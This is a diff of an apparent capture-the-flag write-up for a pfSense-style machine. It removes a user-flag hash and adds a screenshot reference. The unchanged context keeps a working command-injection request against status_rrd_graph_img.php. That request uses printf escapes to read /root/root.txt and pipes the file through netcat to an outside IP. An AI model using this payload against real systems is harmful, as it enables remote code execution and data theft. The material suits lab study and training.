@@ -205,12 +205,11 @@ GET /status_rrd_graph_img.php?database=queues;x=$(printf+"\56");y=$(printf+"\57"
 
 > Submit the user flag.
 
-**Answer:** `8721327cc232073b40d27d9c17e7348b`
-
 ```
 GET /status_rrd_graph_img.php?database=queues;x=$(printf+"\56");y=$(printf+"\57");cat+${x}${x}${y}${x}${x}${y}${x}${x}${y}root${y}root.txt+|+nc+10.10.15.110+1234
 ```
 
+![root.txt flag read via netcat](images/root.png)
+
 > Submit the root flag.
 
-**Answer:** `see final request (not captured in the notes)`
